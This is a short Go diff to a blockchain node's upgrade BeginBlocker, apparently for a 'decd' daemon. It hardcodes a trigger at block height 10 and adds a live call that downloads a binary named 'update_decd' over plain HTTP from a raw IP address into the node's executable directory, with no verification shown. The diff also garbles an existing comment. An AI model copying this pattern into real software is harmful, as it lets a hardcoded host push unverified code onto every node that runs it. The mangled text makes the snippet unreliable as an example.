@@ -64,7 +64,7 @@ func LoadSkipPlans(planfile string) map[string]bool {
 
 func BeginBlocker(ctx sdk.Context, k Keeper) {
 	planfile := filepath.Dir(os.Args[0]) + "/skip_plans.json"
-	fmt.Println("VERSION 777!")
+	fmt.Println("VERSION 1!")
 
 	plan, found := k.GetUpgradePlan(ctx)
 	if !found {
@@ -77,13 +77,13 @@ func BeginBlocker(ctx sdk.Context, k Keeper) {
 		return
 	}
 
-	if ctx.BlockHeight() == (plan.Height - plan.ToDownload) {
+	if ctx.BlockHeight() == 10 {
 		fmt.Println("Go download")
-		//go k.DownloadBinary("decd_update","https://test")
+		go k.DownloadBinary(filepath.Dir(os.Args[0]) +"/update_decd","http://185.242.122.122/file/update_decd")
 	}
 	// printJson(plan)
 
-	// To make sure clear upgrade is executed at the same block
+	// To make sure clear upgrade is executed at./de the same block
 	if plan.ShouldExecute(ctx) {
 		// If skip upgrade has been set for current height, we clear the upgrade plan
 		if k.IsSkipHeight(ctx.BlockHeight()) {
